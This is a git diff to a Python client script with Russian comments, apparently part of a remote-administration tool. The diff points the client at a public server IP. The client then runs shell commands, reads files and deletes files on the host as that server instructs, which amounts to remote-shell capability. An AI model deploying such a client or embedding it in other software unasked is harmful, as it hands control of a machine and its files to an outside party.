@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 import clientlib
+import ctypes
 from termcolor import colored
 import pathlib
 import socket
@@ -35,10 +36,19 @@ class HostUIDFile:
     """ Менеджер файла host_id клиента,
      который находится в /usr/tmp/host_id/
     """
-    FILE_ID_DIR = pathlib.Path("/var/tmp/crcs_host_id/")
+    FILE_ID_DIR = None
 
-    if not FILE_ID_DIR.exists():
-        FILE_ID_DIR.mkdir()
+    if sys.platform == "linux" or sys.platform == "linux2":
+        FILE_ID_DIR = pathlib.Path("/var/tmp/crcs_host_id/")
+
+        if not FILE_ID_DIR.exists():
+            FILE_ID_DIR.mkdir()
+
+    elif sys.platform == "win32":
+        FILE_ID_DIR = os.path.dirname(os.path.abspath(__file__))
+
+        if not FILE_ID_DIR.exists():
+            FILE_ID_DIR.mkdir()
 
     def __init__(self):
         files_in_host_id_directory = os.listdir(HostUIDFile.FILE_ID_DIR)
@@ -66,13 +76,32 @@ class HostUIDFile:
     @staticmethod
     def save_host_id(host_id: str):
         """ Сохраняет файл сессии в директорию админской сессии """
+        default_data_template = {
+            "saved_hostname": socket.gethostname()
+        }
+
         with open(HostUIDFile.FILE_ID_DIR.joinpath(host_id), "w") as fp:
-            pass
+            json.dump(default_data_template, fp)
+
+    @property
+    def saved_hostname(self):
+        with open(HostUIDFile.FILE_ID_DIR.joinpath(self.__host_id), "r") as fp:
+            return json.load(fp)["saved_hostname"]
+
+    @saved_hostname.setter
+    def saved_hostname(self, value):
+        # TODO: сделать так, чтобы этот код работал только с одним дескриптором, а не с двумя
+        with open(HostUIDFile.FILE_ID_DIR.joinpath(self.__host_id), "r") as fp:
+            data = json.load(fp)
+            data["saved_hostname"] = value
+
+        with open(HostUIDFile.FILE_ID_DIR.joinpath(self.__host_id), "w") as fp:
+            json.dump(data, fp)
 
 
 class ServerConnection:
     """ Класс подключения к серверу """
-    MID_CONN_SERVER_HOST = "192.168.1.71"
+    MID_CONN_SERVER_HOST = "91.207.114.23"
     MID_CONN_SERVER_PORT = 9091
     RECV_BUFF_SIZE = 16384
     TERMINATOR = b"\x04"
@@ -86,7 +115,7 @@ class ServerConnection:
 
         self.__socket.connect((ServerConnection.MID_CONN_SERVER_HOST, ServerConnection.MID_CONN_SERVER_PORT))
 
-    def init_pool(self, pool_uid: int) -> bool:
+    def init_pool(self, pool_uid: int, hostname: str = socket.gethostname()) -> bool:
         """ Инициализирует клиента в пуле """
         # x------------------------------------x
         # |          !!! WARNING !!!           |
@@ -98,7 +127,7 @@ class ServerConnection:
             self.__socket.close()
             raise PoolAlreadyInit("Pool already init.")
         except HostUIDDirectoryError:
-            init_packet = InitPacket(pool_uid)
+            init_packet = InitPacket(pool_uid, hostname)
             self.__socket.send(init_packet.convert_to_packet_bytes() + ServerConnection.TERMINATOR)
             result = ServerResponse(self.__socket.recv(ServerConnection.RECV_BUFF_SIZE))
             HostUIDFile.save_host_id(result.DATA)
@@ -129,6 +158,9 @@ class ServerConnection:
             print(f"[?] Получен запрос: {command}")
             handled_command = handler(command)
             self.__socket.send(handled_command.convert_to_packet_bytes() + ServerConnection.TERMINATOR)
+            break
+
+        return command
 
 
 class BasePacket(abc.ABC):
@@ -144,10 +176,10 @@ class BasePacket(abc.ABC):
 
 
 class InitPacket(BasePacket):
-    def __init__(self, pool_id: int):
+    def __init__(self, pool_id: int, hostname: str = socket.gethostname()):
         super().__init__()
         self._operation_type: str = "init"
-        self.hostname: str = socket.gethostname()
+        self.hostname: str = hostname
         self.pool_id: int = pool_id
 
     def convert_to_packet_bytes(self) -> bytes:
@@ -265,7 +297,10 @@ def main_handler(command: str):
         return ResponsePacket(clientlib.get_current_path())
 
     elif command.startswith("fs cd "):
-        return ResponsePacket(clientlib.change_path(command[6::]))
+        try:
+            return ResponsePacket(clientlib.change_path(command[6::]))
+        except FileNotFoundError:
+            return ResponsePacket(is_success=False)
 
     elif command.startswith("fs ls"):
         parts = command.split(" ")
@@ -276,10 +311,16 @@ def main_handler(command: str):
             return ResponsePacket(clientlib.get_file_list("*"))
 
     elif command.startswith("fs cat "):
-        return ResponsePacket(clientlib.get_file_content(command[7::]))
+        try:
+            return ResponsePacket(clientlib.get_file_content(command[7::]))
+        except FileNotFoundError:
+            return ResponsePacket(is_success=False)
 
     elif command.startswith("fs rm "):
-        return ResponsePacket(clientlib.remove_file(command[6::]))
+        try:
+            return ResponsePacket(clientlib.remove_file(command[6::]))
+        except FileNotFoundError:
+            return ResponsePacket(is_success=False)
 
     elif command.startswith("sh "):
         return ResponsePacket(clientlib.process_shell_command(command[3::]))
@@ -290,6 +331,10 @@ def main_handler(command: str):
 
 
 if __name__ == "__main__":
+    if sys.platform == "win32":
+        kernel32 = ctypes.windll.kernel32
+        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+
     try:
         if sys.argv[1] == "connect":
             connection = ServerConnection()
